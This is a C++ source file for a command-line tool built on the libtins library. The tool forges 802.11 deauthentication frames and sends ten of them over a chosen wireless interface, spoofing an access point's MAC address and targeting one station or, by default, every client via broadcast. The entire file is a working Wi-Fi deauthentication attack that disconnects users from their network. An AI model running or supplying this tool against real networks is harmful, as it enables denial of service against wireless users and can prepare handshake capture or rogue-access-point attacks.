#include <iostream>
#include <tins/tins.h>
#include <unistd.h>

using namespace std;
using namespace Tins;

int main(int argc, char *argv[])
{
    string if_name;
    Dot11::address_type ap_addr, st_addr;
    /*
     *  send_deauth <interce name> <ap mac> [<station mac>]
     */

    if(argc < 3){
        cout << "send_deauth <interce name> <ap mac> [<station mac>]" << endl;
        return 1;
    }else if(argc == 3){
        st_addr = Dot11::BROADCAST;
    }else{
        st_addr = HWAddress<6>(argv[3]);
    }

    if_name = argv[1];
    ap_addr = HWAddress<6>(argv[2]);

    /* make deauth packet*/
    Dot11Deauthentication deauth(st_addr, ap_addr);
    deauth.addr3(ap_addr);

    RadioTap tap = RadioTap() / deauth;

    PacketSender sender;
    NetworkInterface iface(if_name);

    /* send deauth packet */
    for(int i=0; i<10; i++){
        sender.send(tap, iface);
        printf("[%d/10] send deauth\n",i+1);
        usleep(100000);
    }

    return 0;
}
